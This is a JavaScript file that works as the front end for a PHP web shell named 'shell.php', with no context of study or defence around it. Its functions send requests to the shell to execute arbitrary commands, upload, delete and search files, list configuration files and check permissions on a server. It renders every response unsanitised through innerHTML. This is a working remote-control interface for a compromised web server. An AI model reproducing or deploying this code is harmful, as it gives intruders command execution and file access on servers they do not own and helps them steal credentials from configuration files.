
function refreshFiles() {
    fetch('shell.php?action=list')
        .then(response => response.text())
        .then(data => {
            document.getElementById('file-list').innerHTML = data;
        });
}


function executeCommand() {
    const command = document.getElementById('command-input').value;
    fetch('shell.php?action=execute&command=' + encodeURIComponent(command))
        .then(response => response.text())
        .then(data => {
            document.getElementById('command-output').innerHTML = data;
        });
}


function uploadFile() {
    const fileInput = document.getElementById('file-upload');
    const formData = new FormData();
    formData.append('file', fileInput.files[0]);
    
    fetch('shell.php?action=upload', {
        method: 'POST',
        body: formData
    }).then(response => response.text())
      .then(data => {
        alert(data);
        refreshFiles();
    });
}


function deleteFile() {
    const fileName = document.getElementById('delete-file').value;
    
    fetch('shell.php?action=delete&file=' + encodeURIComponent(fileName))
        .then(response => response.text())
        .then(data => {
            alert(data);
            refreshFiles();
        });
}


function searchFiles() {
    const keyword = document.getElementById('search-file').value;
    
    fetch('shell.php?action=search&keyword=' + encodeURIComponent(keyword))
        .then(response => response.text())
        .then(data => {
            document.getElementById('file-list').innerHTML = data;
        });
}

function listConfigFiles() {
    fetch('shell.php?action=listConfigs')
        .then(response => response.text())
        .then(data => {
            document.getElementById('file-list').innerHTML = data;
        });
}

function checkPermissions() {
    fetch('shell.php?action=permissions')
        .then(response => response.text())
        .then(data => {
            document.getElementById('file-list').innerHTML = data;
        });
}
